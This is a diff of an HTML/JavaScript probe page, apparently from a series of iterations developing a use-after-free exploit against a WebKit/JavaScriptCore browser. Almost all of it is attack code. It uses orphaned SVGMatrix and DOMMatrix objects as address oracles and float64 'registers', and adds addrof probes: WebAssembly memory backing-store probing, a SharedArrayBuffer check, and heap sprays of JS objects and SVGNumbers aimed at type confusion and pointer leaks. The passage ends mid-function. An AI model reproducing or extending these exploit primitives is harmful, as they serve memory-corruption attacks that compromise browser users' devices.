@@ -2,21 +2,45 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v50 — Address Oracle Probes</title>
+<title>SVG UAF v51 — addrof Probes</title>
 <style>
-body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:13px;padding:16px;margin:0}
-h2{color:#00ff88;margin:8px 0}
-.suite{border:1px solid #333;margin:8px 0;padding:8px}
-pre{white-space:pre-wrap;word-break:break-all;margin:2px 0}
+*{box-sizing:border-box}
+body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
+h2{color:#00ff88;margin:6px 0;font-size:14px}
+#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
+button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
+button:active{background:#00ff88;color:#0a0a0a}
+button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
+button.clear-btn{border-color:#ff4444;color:#ff4444}
+#out{border:1px solid #222;padding:8px;min-height:100px;max-height:70vh;overflow-y:auto}
+pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
+.hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
+.suite-hdr{color:#00aaff;margin-top:6px}
 </style>
 </head>
 <body>
-<h2>SVG UAF v50 — Address Oracle: ADR1/ADR2/ADR3/ADR4</h2>
+<h2>SVG UAF v51 — addrof Probes: OBJ3/OBJ4/OBJ6</h2>
+<div id="controls">
+  <button class="run-all" onclick="runAll()">▶ Run All</button>
+  <button onclick="runSuite('OBJ3')">OBJ3: Wasm Memory</button>
+  <button onclick="runSuite('OBJ4')">OBJ4: Type Confusion</button>
+  <button onclick="runSuite('OBJ6')">OBJ6: Stack/toString Leak</button>
+  <button onclick="runSuite('OBJ7')">OBJ7: JSValue Oracle</button>
+  <button onclick="runSuite('OBJ8')">OBJ8: WeakRef/GC Timing</button>
+  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
+</div>
 <div id="out"></div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
-var log_lines=[];
-function L(s){log_lines.push(s);var d=document.getElementById('out');var p=document.createElement('pre');p.textContent=s;d.appendChild(p);}
+function L(s,cls){
+  var d=document.getElementById('out');
+  var p=document.createElement('pre');
+  if(cls)p.className=cls;
+  p.textContent=s;
+  d.appendChild(p);
+  d.scrollTop=d.scrollHeight;
+}
+function clearOut(){document.getElementById('out').innerHTML='';}
 
 // helpers
 function makeSVG(){
@@ -29,467 +53,528 @@ function makeSVG(){
 function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
 var _tmp=null;
 function getTmp(){if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}return _tmp;}
-function makeSVGNum(v){var n=getTmp().createSVGNumber();n.value=v;return n;}
 
-// float64 bit manipulation via DataView
-var _dv_buf=new ArrayBuffer(8);
-var _dv=new DataView(_dv_buf);
-function f64_to_u32pair(f){
-  _dv.setFloat64(0,f,true); // little-endian
-  return {lo:_dv.getUint32(0,true), hi:_dv.getUint32(4,true)};
-}
-function u32pair_to_f64(lo,hi){
-  _dv.setUint32(0,lo,true);
-  _dv.setUint32(4,hi,true);
-  return _dv.getFloat64(0,true);
-}
-function f64_hex(f){
-  var p=f64_to_u32pair(f);
-  return '0x'+p.hi.toString(16).padStart(8,'0')+p.lo.toString(16).padStart(8,'0');
-}
-// encode integer K as float64 exactly (K must be safe integer)
-function int_to_f64(k){return k;}  // JS numbers are f64, so just assign
+// float64 bit ops
+var _dv=new DataView(new ArrayBuffer(8));
+function f64bits(f){_dv.setFloat64(0,f,false);return{hi:_dv.getUint32(0,false),lo:_dv.getUint32(4,false)};}
+function bits2f64(hi,lo){_dv.setUint32(0,hi,false);_dv.setUint32(4,lo,false);return _dv.getFloat64(0,false);}
+function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
 
-// ─────────────────────────────────────────────────────────────────
-// ADR1 — SVGMatrix.inverse() as Integer/Pointer Oracle
-// If we write 1/K as float64 into matrix.a, inverse() gives us K back
-// We probe with "pointer-like" values (upper bits set) to see if
-// inverse() can echo back arbitrary 64-bit patterns
-// ─────────────────────────────────────────────────────────────────
-function runADR1(){
-  L('');L('ADR1: SVGMatrix inverse() as address oracle');
-
+// SVGMatrix oracle (confirmed v50)
+function getOrphanedMatrix(){
   var svg=makeSVG();
-  var g=document.createElementNS(SVG_NS,'g');
-  svg.appendChild(g);
-  var xfList=g.transform.baseVal;
-  var xf=svg.createSVGTransform();
-  xfList.appendItem(xf);
-  var m=xfList.getItem(0).matrix;
-
-  // identity: det=a*d-b*c=1, b=c=0, e=f=0
-  // inv.a = d/det = 1, inv.b = -b/det = 0, etc
-  // For det=1, a=d: inv.a=d, inv.d=a, inv.b=-b, inv.c=-c
-  // Negation oracle: inv.e = -(a*f - d*e)/(det) for 2D
-  // For a=d=1,b=c=0: inv.e = -(f - e) / 1 ??? let's test
-
-  // Full inverse formula for 2D affine (a,b,c,d,e,f):
-  // det = a*d - b*c
-  // inv.a = d/det
-  // inv.b = -b/det
-  // inv.c = -c/det
-  // inv.d = a/det
-  // inv.e = (c*f - d*e)/det
-  // inv.f = (b*e - a*f)/det
-
-  // integer echo: set a=1/K, b=c=0, d=K (so det = (1/K)*K - 0 = 1)
-  // inv.a = K/1 = K  ← echoes K back as float64!
-  // inv.d = (1/K)/1 = 1/K
-
-  L('ADR1: [Test 1] integer echo via a=1/K, d=K, b=c=e=f=0');
-  var echo_tests=[
-    {K:2,        name:'K=2'},
-    {K:1000,     name:'K=1000'},
-    {K:65536,    name:'K=65536'},
-    {K:0x100000, name:'K=0x100000'},
-    {K:0x1000000,name:'K=0x1000000'},
-    {K:0xFFFFFF, name:'K=0xFFFFFF'},
-    {K:1e9,      name:'K=1e9'},
-    {K:1e12,     name:'K=1e12'},
-    {K:1e15,     name:'K=1e15'},
-    {K:Number.MAX_SAFE_INTEGER, name:'K=MAX_SAFE_INT'},
-  ];
-  var all_echo=true;
-  for(var i=0;i<echo_tests.length;i++){
-    var K=echo_tests[i].K;
-    m.a=1/K; m.b=0; m.c=0; m.d=K; m.e=0; m.f=0;
-    var inv=m.inverse();
-    var got=inv.a;
-    var exact=(got===K);
-    if(!exact)all_echo=false;
-    L('ADR1: a=1/'+K+' d='+K+' → inv.a='+got+' exact='+exact);
-  }
-  L('ADR1: all_echo='+all_echo);
-
-  // Test 2: encode pointer-like 48-bit value via 1/K echo
-  // Real iOS arm64 heap pointers are ~0x1xx_xxxxxxxx (tagged)
-  // We simulate: K = 0x180001234  (a plausible heap addr)
-  L('ADR1: [Test 2] pointer-like values');
-  var ptr_tests=[
-    0x180001234,
-    0x1b0000000,
-    0x100000001,
-    0x1ffffffff,
-    // max exact: 2^53-1 = 9007199254740991
-    9007199254740991,
-  ];
-  for(var i=0;i<ptr_tests.length;i++){
-    var K=ptr_tests[i];
-    m.a=1/K; m.b=0; m.c=0; m.d=K; m.e=0; m.f=0;
-    try{
-      var inv=m.inverse();
-      var got=inv.a;
-      var exact=(got===K);
-      L('ADR1: K=0x'+K.toString(16)+' → inv.a='+got+' hex='+f64_hex(got)+' exact='+exact);
-    }catch(ex){L('ADR1: K=0x'+K.toString(16)+' THREW: '+ex.message);}
-  }
-
-  // Test 3: e-field pass-through oracle
-  // det=1, a=d=1, b=c=0 → inv.e = (c*f - d*e)/det = (0 - 1*e)/1 = -e
-  // So inv.e = -e exactly (negation oracle, confirmed v48)
-  // Can we use TWO fields to pass through a full 64-bit value?
-  // Encode: hi bits in e, lo bits in f, recover via inv
-  L('ADR1: [Test 3] two-field 64-bit value encoding');
-  // Use e and f fields:
-  // a=d=1, b=c=0 → inv.e=-e, inv.f=-f
-  // So we can pass two independent float64 values: e→-inv.e, f→-inv.f
-  // Encode a 53-bit "pointer" split across e (high 26 bits) and f (low 27 bits)
-  var target_ptr=0x1b000abcdef; // 44-bit value
-  var hi_part=Math.floor(target_ptr/0x10000000); // top bits
-  var lo_part=target_ptr - hi_part*0x10000000;   // bottom bits
-  m.a=1; m.b=0; m.c=0; m.d=1; m.e=hi_part; m.f=lo_part;
-  var inv3=m.inverse();
-  var rec_hi=-inv3.e;
-  var rec_lo=-inv3.f;
-  var rec_ptr=rec_hi*0x10000000+rec_lo;
-  L('ADR1: target_ptr=0x'+target_ptr.toString(16));
-  L('ADR1: hi='+hi_part+' lo='+lo_part);
-  L('ADR1: recovered hi='+rec_hi+' lo='+rec_lo+' → ptr=0x'+rec_ptr.toString(16));
-  L('ADR1: two-field exact='+(rec_ptr===target_ptr));
-
-  // Test 4: full 64-bit IEEE754 double encoding via a-field echo
-  // Can we write arbitrary bit patterns as f64 and get them back?
-  L('ADR1: [Test 4] arbitrary f64 bit pattern echo');
-  // Encode: a = arbitrary float (including NaN, Inf, subnormal)
-  // We need 1/K where K = our target, then inv.a = K
-  // BUT: this requires K to be a finite nonzero value
-  // For pointer echoing: K IS the pointer value (finite, nonzero, < 2^53)
-  // Check upper limit
-  var pow2_53=Math.pow(2,53);
-  m.a=1/pow2_53; m.b=0; m.c=0; m.d=pow2_53; m.e=0; m.f=0;
-  try{var inv4=m.inverse();L('ADR1: K=2^53 → inv.a='+inv4.a+' exact='+(inv4.a===pow2_53));}
-  catch(ex){L('ADR1: K=2^53 THREW: '+ex.message);}
-
-  var pow2_53p1=pow2_53+1; // not exactly representable!
-  m.a=1/pow2_53p1; m.b=0; m.c=0; m.d=pow2_53p1; m.e=0; m.f=0;
-  try{var inv4b=m.inverse();L('ADR1: K=2^53+1 → inv.a='+inv4b.a+' exact='+(inv4b.a===pow2_53p1)+' (precision limit)');}
-  catch(ex){L('ADR1: K=2^53+1 THREW: '+ex.message);}
-
-  removeSVG(svg);
-  return {all_echo:all_echo};
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR2 — SVGPoint.matrixTransform() as computation oracle
-// matrixTransform(SVGMatrix) → new SVGPoint
-// x' = a*x + c*y + e
-// y' = b*x + d*y + f
-// Are inputs/outputs float64?
-// ─────────────────────────────────────────────────────────────────
-function runADR2(){
-  L('');L('ADR2: SVGPoint.matrixTransform() oracle');
-
-  var svg=makeSVG();
-  // Get SVGPoint via createSVGPoint
-  var pt=svg.createSVGPoint();
-
-  // Get SVGMatrix via transform
-  var g=document.createElementNS(SVG_NS,'g');
-  svg.appendChild(g);
+  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
   var xf=svg.createSVGTransform();
   g.transform.baseVal.appendItem(xf);
   var m=g.transform.baseVal.getItem(0).matrix;
-
-  // Test 1: basic computation check
-  pt.x=3; pt.y=7;
-  m.a=2; m.b=0; m.c=0; m.d=2; m.e=1; m.f=1;
-  var r1=pt.matrixTransform(m);
-  L('ADR2: [Test 1] pt=(3,7) m=(2,0,0,2,1,1) → expected (7,15) got=('+r1.x+','+r1.y+') exact='+(r1.x===7&&r1.y===15));
-
-  // Test 2: float64 precision in inputs
-  pt.x=1/3; pt.y=0;
-  m.a=3; m.b=0; m.c=0; m.d=1; m.e=0; m.f=0;
-  var r2=pt.matrixTransform(m);
-  L('ADR2: [Test 2] pt.x=1/3, m.a=3 → expected x=1 got='+r2.x+' exact='+(r2.x===1));
-
-  // Test 3: large integer echo via point+matrix
-  // x'=a*x+e. Set a=1,x=K,e=0 → x'=K
-  // OR: a=K, x=1 → x'=K
-  var K=0x180001234;
-  pt.x=1; pt.y=0;
-  m.a=K; m.b=0; m.c=0; m.d=1; m.e=0; m.f=0;
-  var r3=pt.matrixTransform(m);
-  L('ADR2: [Test 3] K=0x'+K.toString(16)+' via a=K → x\'='+r3.x+' exact='+(r3.x===K));
-
-  // Test 4: SVGPoint x field precision
-  pt.x=1/3; var got_x=pt.x;
-  L('ADR2: [Test 4] SVGPoint.x storage: wrote 1/3='+1/3+' got='+got_x+' f64='+(got_x===1/3)+' f32='+(got_x===Math.fround(1/3)));
-
-  pt.x=Math.PI; var got_pi=pt.x;
-  L('ADR2: [Test 4b] SVGPoint.x=π: got='+got_pi+' f64='+(got_pi===Math.PI)+' f32='+(got_pi===Math.fround(Math.PI)));
-
-  // Test 5: can we set SVGPoint.x to a pointer-like value and read it back via matrixTransform?
-  var target=0x1b0001234;
-  pt.x=target; pt.y=0;
-  m.a=1; m.b=0; m.c=0; m.d=1; m.e=0; m.f=0;
-  var r5=pt.matrixTransform(m);
-  L('ADR2: [Test 5] ptr echo: target=0x'+target.toString(16)+' → x\'='+r5.x+' exact='+(r5.x===target));
-
-  // Test 6: orphan SVGPoint — does it stay alive?
-  var pt2=svg.createSVGPoint();
-  pt2.x=12345; pt2.y=67890;
-  removeSVG(svg);  // remove SVG but keep pt2 reference
-  try{L('ADR2: [Test 6] SVGPoint after SVG removal: x='+pt2.x+' y='+pt2.y+' ALIVE');}
-  catch(ex){L('ADR2: [Test 6] SVGPoint DEAD: '+ex.message);}
-  try{pt2.x=99999;L('ADR2: [Test 6b] SVGPoint write after SVG removal: x='+pt2.x+' WRITABLE');}
-  catch(ex){L('ADR2: [Test 6b] THREW: '+ex.message);}
-
-  return {};
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR3 — DOMMatrix operations as oracle
-// DOMMatrix has 22 float64 fields (confirmed v48)
-// Test: multiply(), translate(), invertSelf(), transformPoint()
-// Can we encode/recover arbitrary 64-bit values through DOMMatrix math?
-// ─────────────────────────────────────────────────────────────────
-function runADR3(){
-  L('');L('ADR3: DOMMatrix operations oracle');
-
-  // Test 1: DOMMatrix.invertSelf() — same as SVGMatrix.inverse()?
-  var dm=new DOMMatrix();
-  dm.a=1/1000; dm.b=0; dm.c=0; dm.d=1000; dm.e=0; dm.f=0;
-  var dm2=dm.inverse();
-  L('ADR3: [Test 1] DOMMatrix.inverse(): a=1/1000 d=1000 → inv.a='+dm2.a+' exact='+(dm2.a===1000));
-
-  // Test 2: DOMMatrix.multiply() — does it operate in float64?
-  var dmA=new DOMMatrix([2,0,0,2,0,0]);
-  var dmB=new DOMMatrix([3,0,0,3,0,0]);
-  var dmC=dmA.multiply(dmB);
-  L('ADR3: [Test 2] multiply (scale 2 × scale 3) → a='+dmC.a+' expected=6 exact='+(dmC.a===6));
-
-  // Test 3: transformPoint() — same as matrixTransform but on DOMMatrix
-  var pt=new DOMPoint(1/3, 0);
-  var dmScale=new DOMMatrix([3,0,0,1,0,0]);
-  var r=dmScale.transformPoint(pt);
-  L('ADR3: [Test 3] transformPoint: pt.x=1/3, m.a=3 → x\'='+r.x+' exact='+(r.x===1));
-
-  // Test 4: DOMMatrix m13/m14/m31... fields (3D fields)
-  // These are the extra 16 fields beyond a/b/c/d/e/f
-  // Test if they participate in computation
-  var dm3d=new DOMMatrix();
-  dm3d.m13=1/7; dm3d.m14=Math.PI;
-  var read_m13=dm3d.m13; var read_m14=dm3d.m14;
-  L('ADR3: [Test 4] 3D fields: m13=1/7 got='+read_m13+' f64='+(read_m13===1/7));
-  L('ADR3: [Test 4b] m14=π got='+read_m14+' f64='+(read_m14===Math.PI));
-
-  // Test 5: large integer echo via DOMMatrix.inverse()
-  var K=0x1b0001234; // 44-bit pointer-like
-  var dm5=new DOMMatrix();
-  dm5.a=1/K; dm5.b=0; dm5.c=0; dm5.d=K; dm5.e=0; dm5.f=0;
-  try{
-    var inv5=dm5.inverse();
-    L('ADR3: [Test 5] K=0x'+K.toString(16)+' → inv.a='+inv5.a+' exact='+(inv5.a===K));
-  }catch(ex){L('ADR3: [Test 5] THREW: '+ex.message);}
-
-  // Test 6: DOMMatrix.translate() — does it carry float64 through?
-  var dm6=new DOMMatrix();
-  var tx=0x1b0001234, ty=0x200001234;
-  var dm6t=dm6.translate(tx,ty);
-  L('ADR3: [Test 6] translate('+tx.toString(16)+','+ty.toString(16)+') → e='+dm6t.e+' f='+dm6t.f);
-  L('ADR3: [Test 6] e_exact='+(dm6t.e===tx)+' f_exact='+(dm6t.f===ty));
-
-  // Test 7: chain — encode ptr in translate, then inverse, recover
-  // translate sets e=tx → inverse of translate: inv.e = -tx (negation oracle)
-  var dm7=new DOMMatrix().translate(K, 0);
-  try{
-    var inv7=dm7.inverse();
-    L('ADR3: [Test 7] translate(K) then inverse: inv.e='+inv7.e+' expected='+(-(K))+' exact='+(inv7.e===-(K)));
-  }catch(ex){L('ADR3: [Test 7] THREW: '+ex.message);}
-
-  return {};
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR4 — SVGMatrix storage: write float64 pattern, orphan, check survival
-// We confirmed STO1: matrix fields are float64.
-// Now: write pointer-like bits, orphan the transform, check if bits survive
-// This tests: can we use SVGMatrix as a float64 "register" that holds
-// arbitrary 64-bit values even after DOM removal?
-// ─────────────────────────────────────────────────────────────────
-function runADR4(){
-  L('');L('ADR4: SVGMatrix as orphaned float64 register');
-
-  var svg=makeSVG();
-  var g=document.createElementNS(SVG_NS,'g');
-  svg.appendChild(g);
-  var xfList=g.transform.baseVal;
-  var xf=svg.createSVGTransform();
-  xfList.appendItem(xf);
-  var m=xfList.getItem(0).matrix;
-
-  // Write pointer-like values into all 6 fields
-  var vals=[
-    0x1b0001234,
-    0x1b0005678,
-    0x1c000abcd,
-    0x1d000ef01,
-    1/3,
-    Math.PI
-  ];
-  m.a=vals[0]; m.b=vals[1]; m.c=vals[2]; m.d=vals[3]; m.e=vals[4]; m.f=vals[5];
-
-  // Verify before orphan
-  L('ADR4: [before orphan] a=0x'+m.a.toString(16)+' b=0x'+m.b.toString(16)+' e='+m.e+' f='+m.f);
-  L('ADR4: a_exact='+(m.a===vals[0])+' b_exact='+(m.b===vals[1])+' e_exact='+(m.e===vals[4]));
-
-  // Orphan: remove xf from list
-  xfList.removeItem(0);
-  // Remove g from SVG
+  g.transform.baseVal.removeItem(0);
   g.parentNode.removeChild(g);
-  // Remove SVG from DOM
   removeSVG(svg);
-
-  // Check if values survive
-  try{
-    var a_after=m.a; var b_after=m.b; var e_after=m.e; var f_after=m.f;
-    L('ADR4: [after full orphan] a='+a_after+' b='+b_after+' e='+e_after+' f='+f_after);
-    L('ADR4: a_survived='+(a_after===vals[0])+' b_survived='+(b_after===vals[1]));
-    L('ADR4: e_survived='+(e_after===vals[4])+' f_survived='+(f_after===vals[5]));
-    L('ADR4: ★ SVGMatrix holds float64 values after full orphan!');
-
-    // Can we still call inverse() on orphaned matrix?
-    m.a=1/1000; m.b=0; m.c=0; m.d=1000; m.e=12345; m.f=0;
-    try{
-      var inv_orp=m.inverse();
-      L('ADR4: [orphaned matrix inverse()] inv.a='+inv_orp.a+' inv.e='+inv_orp.e);
-      L('ADR4: inv_a_exact='+(inv_orp.a===1000)+' inv_e_exact='+(inv_orp.e===-12345));
-      L('ADR4: ★ inverse() works on ORPHANED SVGMatrix!');
-    }catch(ex){
-      L('ADR4: orphaned inverse() THREW: '+ex.message);
-    }
-  }catch(ex){
-    L('ADR4: [after full orphan] THREW: '+ex.message+' → matrix died');
-  }
-
-  // Test: get matrix from orphaned SVGTransform directly
-  L('ADR4: [Sub-test B] access matrix from orphaned SVGTransform object');
-  var svg2=makeSVG();
-  var g2=document.createElementNS(SVG_NS,'g');
-  svg2.appendChild(g2);
-  var xf2=svg2.createSVGTransform();
-  g2.transform.baseVal.appendItem(xf2);
-  // Remove from DOM but keep xf2 reference
-  g2.transform.baseVal.removeItem(0);
-  g2.parentNode.removeChild(g2);
-  removeSVG(svg2);
-  try{
-    var m2=xf2.matrix; // access matrix on orphaned transform
-    m2.a=0xdeadbeef;
-    L('ADR4: [B] xf2.matrix.a after orphan: wrote 0xdeadbeef, got='+m2.a+' hex=0x'+m2.a.toString(16));
-    L('ADR4: [B] exact='+(m2.a===0xdeadbeef));
-  }catch(ex){
-    L('ADR4: [B] THREW: '+ex.message);
-  }
-
-  // Test: DOMMatrix as register — write bits, read back, all 22 fields
-  L('ADR4: [Sub-test C] DOMMatrix as float64 register (all 22 fields)');
-  var dm=new DOMMatrix();
-  var fields=['a','b','c','d','e','f','m11','m12','m13','m14','m21','m22','m23','m24','m31','m32','m33','m34','m41','m42','m43','m44'];
-  var ptr_base=0x1b0000000;
-  var all_exact=true;
-  for(var i=0;i<fields.length;i++){
-    var v=ptr_base+i*0x1234;
-    dm[fields[i]]=v;
-    var got=dm[fields[i]];
-    if(got!==v){all_exact=false;L('ADR4: [C] field '+fields[i]+' MISMATCH: wrote='+v+' got='+got);}
-  }
-  L('ADR4: [C] DOMMatrix all 22 fields exact: '+all_exact);
-  if(all_exact){
-    L('ADR4: ★★ DOMMatrix = 176-byte float64 register, all fields hold arbitrary values');
-  }
-
-  return {};
+  return m;
+}
+function echoK(K){
+  // write a=1/K, d=K, b=c=e=f=0 → inv.a = K
+  var m=getOrphanedMatrix();
+  m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
+  return m.inverse().a;
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR5 — Bonus: getBoundingClientRect / getComputedStyle leak probe
-// Do any layout APIs leak internal values that correlate with addresses?
+// OBJ3 — WebAssembly.Memory backing store probe
+// Wasm linear memory is allocated via mmap (separate from JSC heap)
+// memory.buffer is an ArrayBuffer — its backing pointer is at a fixed
+// offset in the JSC ArrayBuffer object structure
+// Test: can we detect the backing store address via any side-channel?
 // ─────────────────────────────────────────────────────────────────
-function runADR5(){
-  L('');L('ADR5: Layout/Style leak probe');
+function runOBJ3(){
+  L('','suite-hdr');L('OBJ3: WebAssembly.Memory backing store probe');
 
-  // getBoundingClientRect returns DOMRect — all float64 values
-  // These are computed from layout engine, not directly from addresses
-  // But: do precision artifacts appear? Do large SVGLength values cause issues?
+  if(typeof WebAssembly==='undefined'){L('OBJ3: WebAssembly not available','miss');return;}
+
+  // Create a Wasm memory
+  var mem=new WebAssembly.Memory({initial:1}); // 1 page = 64KB
+  var buf=mem.buffer;
+  L('OBJ3: mem.buffer.byteLength='+buf.byteLength+' ('+buf.byteLength/1024+'KB)');
+  L('OBJ3: buf instanceof ArrayBuffer='+(buf instanceof ArrayBuffer));
+  L('OBJ3: buf instanceof SharedArrayBuffer='+(buf instanceof SharedArrayBuffer));
+
+  // Write a canary to Wasm memory
+  var u8=new Uint8Array(buf);
+  u8[0]=0xDE;u8[1]=0xAD;u8[2]=0xBE;u8[3]=0xEF;
+  L('OBJ3: wrote canary 0xDEADBEEF at offset 0');
+
+  // Grow memory — does the buffer pointer change?
+  try{
+    mem.grow(1); // grow by 1 page
+    var buf2=mem.buffer; // new buffer after grow
+    var u82=new Uint8Array(buf2);
+    L('OBJ3: after grow(1): byteLength='+buf2.byteLength);
+    L('OBJ3: buf===buf2: '+(buf===buf2)+' (expect false — grows replace buffer)');
+    // Check if old buffer is detached
+    L('OBJ3: old buf.byteLength after grow: '+buf.byteLength+' (0=detached)');
+    // Check canary in new buffer
+    L('OBJ3: canary in new buf: 0x'+u82[0].toString(16)+u82[1].toString(16)+u82[2].toString(16)+u82[3].toString(16));
+  }catch(ex){L('OBJ3: grow failed: '+ex.message,'warn');}
+
+  // Try to get backing store address via DataView
+  // The ArrayBuffer object in JSC has: [header][butterfly ptr][backing store ptr][byteLength]
+  // We can't directly read JSC internals from JS without a confusion primitive
+  // BUT: we can probe alignment
+  var mem2=new WebAssembly.Memory({initial:4}); // 4 pages = 256KB
+  var buf3=mem2.buffer;
+  var u32=new Uint32Array(buf3);
+  // Write pattern to detect if Wasm memory overlaps with anything interesting
+  for(var i=0;i<16;i++) u32[i]=0xAAAA0000+i;
+  L('OBJ3: wrote pattern to Wasm memory[0..15]');
+
+  // Spray SVGNumbers — do any of them reflect Wasm memory?
+  // This would indicate shared address space visibility
   var svg=makeSVG();
-  svg.style.cssText='position:fixed;top:0;left:0;width:1000px;height:1000px;opacity:0';
-  var rect=document.createElementNS(SVG_NS,'rect');
-  rect.setAttribute('x','0');
-  rect.setAttribute('y','0');
-  rect.setAttribute('width','100');
-  rect.setAttribute('height','100');
-  svg.appendChild(rect);
+  var f=document.createElementNS(SVG_NS,'feColorMatrix');
+  f.setAttribute('type','matrix');
+  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','fw1');
+  filt.appendChild(f);svg.appendChild(filt);
+  var bl=f.values.baseVal;bl.clear();
+  // Spray 100 SVGNumbers with known values
+  var refs=[];
+  for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=1000+i;bl.appendItem(n);refs.push(bl.getItem(bl.length-1));}
+  filt.parentNode.removeChild(filt); // orphan
 
-  var br=rect.getBoundingClientRect();
-  L('ADR5: [rect BBCR] x='+br.x+' y='+br.y+' w='+br.width+' h='+br.height);
+  // Check if any SVGNumber values changed to match Wasm pattern
+  var wasm_hit=false;
+  for(var i=0;i<refs.length;i++){
+    var v=refs[i].value;
+    if(v!==1000+i){wasm_hit=true;L('OBJ3: ★ SVGNumber['+i+'] changed: was='+(1000+i)+' got='+v,'hit');}
+  }
+  if(!wasm_hit) L('OBJ3: no Wasm/SVGNumber overlap detected');
 
-  // Set large width via orphaned SVGLength
-  var lenRef=rect.width.baseVal;
-  rect.parentNode.removeChild(rect);  // orphan
-  lenRef.value=1e15;  // write large value to orphaned SVGLength
-  // Re-add rect
-  svg.appendChild(rect);
-  var br2=rect.getBoundingClientRect();
-  L('ADR5: [after large orphan write] w='+br2.width+' (wrote 1e15 via orphan)');
-
-  // getComputedStyle
-  var cs=window.getComputedStyle(svg);
-  L('ADR5: computed transform='+cs.transform);
-
-  // CTM / getScreenCTM — do these use float64?
+  // Try: SharedArrayBuffer (may be blocked by COOP/COEP)
   try{
-    var ctm=svg.getCTM();
-    if(ctm) L('ADR5: getCTM() a='+ctm.a+' e='+ctm.e+' f='+ctm.f);
-    else L('ADR5: getCTM() returned null');
-    var sctm=svg.getScreenCTM();
-    if(sctm) L('ADR5: getScreenCTM() a='+sctm.a+' e='+sctm.e+' f='+sctm.f);
-  }catch(ex){L('ADR5: CTM THREW: '+ex.message);}
+    var sab=new SharedArrayBuffer(65536);
+    L('OBJ3: SharedArrayBuffer available! byteLength='+sab.byteLength,'hit');
+    // If SAB available, Atomics.wait/waitAsync timing might work
+    L('OBJ3: Atomics available='+(typeof Atomics!=='undefined'));
+  }catch(ex){
+    L('OBJ3: SharedArrayBuffer blocked: '+ex.message);
+  }
 
-  // SVGMatrix from getCTM — is it the same C++ type? Can we write to it?
-  try{
-    var ctm2=svg.getCTM();
-    if(ctm2){
-      ctm2.e=12345.678;
-      L('ADR5: getCTM() matrix write: e='+ctm2.e+' f64='+(ctm2.e===12345.678));
+  // Report Wasm memory address range indirectly via timing
+  // Allocate many Wasm memories, see if any SVGNumbers reflect changes
+  L('OBJ3: done');
+  removeSVG(svg);
+}
+
+// ─────────────────────────────────────────────────────────────────
+// OBJ4 — Type Confusion via IsoHeap spray
+// IsoHeap is bump-only: allocation order = memory layout
+// If we spray SVGNumber objects then free them (orphan) and spray
+// a DIFFERENT type that has the same size → same IsoHeap bucket?
+// No — IsoHeap is PER C++ TYPE. But: can we spray enough of one type
+// to probe if a DIFFERENT type lands adjacently in a different IsoHeap?
+//
+// Real approach: find two C++ types with same sizeof that share a
+// fastMalloc bucket. Neither SVGNumber nor SVGMatrix uses fastMalloc
+// for their array items — they use IsoHeap.
+//
+// Sub-approach: JSC JSObject butterfly is fastMalloc.
+// If we allocate a JS array, its butterfly (property storage) is
+// allocated via fastMalloc. fastMalloc ZEROES on alloc (confirmed v48).
+// BUT: after zeroing, we can write to it via normal JS.
+// Can we get a JSC butterfly pointer into an SVGMatrix field?
+//
+// BUTTERFLY PROBE: alloc many JS objects, free them (set null),
+// alloc SVGNumbers → if IsoHeap and fastMalloc share any region,
+// a butterfly ptr might appear in SVGNumber.value (as float32 bits)
+// ─────────────────────────────────────────────────────────────────
+function runOBJ4(){
+  L('','suite-hdr');L('OBJ4: Type Confusion / IsoHeap spray probe');
+
+  // Test 1: Spray JS objects, then spray SVGNumbers, look for ptr artifacts
+  L('OBJ4: [Test 1] JS object spray → SVGNumber spray, looking for ptr artifacts');
+
+  // Spray 10000 JS objects to fill fastMalloc pages
+  var objs=[];
+  for(var i=0;i<10000;i++) objs.push({x:i,y:i*2,z:i*3});
+  // Free half of them
+  for(var i=0;i<5000;i++) objs[i]=null;
+  // Trigger GC hint
+  try{if(typeof gc==='function')gc();}catch(e){}
+
+  // Now spray SVGNumbers
+  var svg=makeSVG();
+  var fcms=[];
+  for(var k=0;k<5;k++){
+    var f=document.createElementNS(SVG_NS,'feColorMatrix');
+    f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','fo'+k);
+    filt.appendChild(f);svg.appendChild(filt);
+    var bl=f.values.baseVal;bl.clear();
+    var refs=[];
+    for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=0;bl.appendItem(n);refs.push(bl.getItem(bl.length-1));}
+    filt.parentNode.removeChild(filt);
+    fcms.push({refs:refs});
+  }
+
+  // Check if any SVGNumber.value is nonzero (would indicate ptr bits leaked in as float32)
+  var artifacts=0;
+  for(var k=0;k<fcms.length;k++){
+    for(var i=0;i<fcms[k].refs.length;i++){
+      var v=fcms[k].refs[i].value;
+      if(v!==0){
+        artifacts++;
+        if(artifacts<=5) L('OBJ4: artifact! fcm['+k+']['+i+']='+v+' bits='+f64hex(v),'hit');
+      }
     }
-  }catch(ex){L('ADR5: getCTM write THREW: '+ex.message);}
+  }
